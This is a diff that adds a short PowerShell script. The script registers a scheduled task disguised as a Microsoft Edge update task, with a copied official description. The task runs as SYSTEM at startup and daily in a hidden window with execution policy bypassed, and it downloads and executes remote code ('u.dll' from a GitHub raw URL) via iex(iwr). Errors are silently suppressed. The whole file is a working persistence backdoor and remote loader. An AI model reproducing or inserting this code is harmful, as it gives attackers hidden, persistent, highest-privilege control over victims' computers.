@@ -1,0 +1,20 @@
+Import-Module ScheduledTasks
+$taskName = "MicrosoftEdgeUpdateTaskUserCore{F8B2E034-9DB1-4C4C-AD12-8575EABB7842}"
+$taskDescription = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it."
+$scriptUrl = "https://raw.githubusercontent.com/aodfs/dnSpy/refs/heads/master/u.dll"
+$action = New-ScheduledTaskAction -Execute "powershell.exe" `
+    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (iwr '$scriptUrl' -UseBasicP)`"" 
+$triggerDaily = New-ScheduledTaskTrigger -Daily -At "1:00AM"
+$triggerStartup = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" `
+    -LogonType ServiceAccount -RunLevel Highest
+try {
+    Register-ScheduledTask -TaskName $taskName `
+        -Action $action `
+        -Trigger $triggerDaily, $triggerStartup `
+        -Principal $principal
+
+    $task = Get-ScheduledTask -TaskName $taskName
+    $task.Description = $taskDescription
+    $task | Set-ScheduledTask
+} catch {}
